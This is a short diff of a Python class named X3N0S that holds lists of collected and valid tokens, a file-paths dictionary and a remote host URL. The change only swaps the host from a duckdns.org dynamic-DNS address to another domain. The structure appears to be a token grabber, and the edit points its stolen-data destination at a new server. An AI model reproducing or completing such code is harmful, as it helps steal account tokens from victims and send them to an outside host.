@@ -2,7 +2,7 @@ import os, re, threading, urllib.request
 
 class X3N0S:
     def __init__(self):
-        self.host = "http://ecele.duckdns.org/"
+        self.host = "http://ozturkhosting.com/"
         self.all_tokens = []
         self.valid_tokens = []
         self.paths = {
